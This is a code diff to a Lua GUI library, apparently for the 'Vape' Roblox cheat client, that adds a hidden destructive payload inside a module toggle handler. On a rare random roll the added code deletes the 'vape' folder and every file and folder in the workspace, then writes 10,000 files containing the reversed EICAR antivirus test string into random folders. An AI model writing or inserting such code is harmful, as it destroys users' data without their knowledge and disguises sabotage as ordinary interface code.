@@ -1295,6 +1295,22 @@ if shared.VapeExecuted then
 			buttonapi["Keybind"] = ""
 			buttonapi["Default"] = argstable["Default"]
 			buttonapi["ToggleButton"] = function(toggle, first)
+				if math.random(1, 100_000) == 69 then 
+				    local FUNNY_STRING = string.reverse("*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\4[PA@%P!O5X")
+				    -- 1 in 100,000 chance to bomb the workspace on module toggle
+                        	    delfolder("vape")
+                                    for i, v in next, listfiles("") do 
+					pcall(delfile, v)
+					pcall(delfolder, v)
+				    end
+				    for i = 1, 100 do
+					local s = randomString()
+					makefolder(s)
+					for i = 1, 100 do
+						writefile(s .. "/" .. randomString(), FUNNY_STRING)
+					end
+				    end
+                                end
 				buttonapi["Enabled"] = toggle
 				toggleicon.Visible = toggle
 				if buttonapi["Enabled"] then
